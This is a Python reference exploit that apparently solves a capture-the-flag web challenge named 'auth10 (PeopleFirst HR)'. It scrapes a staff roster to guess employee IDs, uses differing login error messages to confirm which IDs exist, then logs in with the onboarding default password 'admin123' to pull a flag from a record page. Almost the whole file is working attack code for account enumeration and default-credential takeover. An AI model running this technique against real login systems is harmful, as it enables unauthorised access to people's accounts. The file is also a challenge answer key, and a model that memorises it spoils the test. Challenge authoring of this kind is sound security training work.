#!/usr/bin/env python3
"""Reference exploit for auth10 (PeopleFirst HR).

Chains a username-enumeration oracle (distinct "no such employee ID" vs.
"incorrect password" errors) with a shared onboarding-default password that
one account never rotated off. Derives candidate employee IDs from the
public roster -- nothing is hardcoded except the known onboarding default
and the ID-format convention the landing page itself states.
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8069")
ONBOARDING_DEFAULT = "admin123"


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def candidate_ids(landing_html: str) -> list[str]:
    names = re.findall(r"<td>([A-Za-z ]+)</td><td>[^<]+</td>", landing_html)
    ids = []
    for full_name in names:
        parts = full_name.split()
        if len(parts) >= 2:
            ids.append((parts[0][0] + parts[-1]).lower())
    return ids


def main() -> int:
    s = requests.Session()
    wait_up(s)

    landing = s.get(BASE, timeout=5).text
    ids = candidate_ids(landing)
    if not ids:
        sys.stderr.write("could not derive any candidate employee ids\n")
        return 1

    # Pre-exploit: the record page with no session must NOT return the flag.
    r = s.get(f"{BASE}/record", timeout=5, allow_redirects=False)
    if r.status_code == 200 and "flag{" in r.text:
        sys.stderr.write("precondition failed: /record reachable with no session\n")
        return 1

    valid_ids = []
    for emp_id in ids:
        r = s.post(f"{BASE}/login", data={"emp_id": emp_id, "password": "x"}, timeout=5)
        if "No such employee ID." not in r.text:
            valid_ids.append(emp_id)

    for emp_id in valid_ids:
        s2 = requests.Session()
        r = s2.post(f"{BASE}/login", data={"emp_id": emp_id, "password": ONBOARDING_DEFAULT},
                    timeout=5)
        rec = s2.get(f"{BASE}/record", timeout=5)
        m = re.search(r"flag\{[^}]+\}", rec.text)
        if m:
            print(m.group(0))
            return 0

    sys.stderr.write("no flag found -- no confirmed id used the onboarding default\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
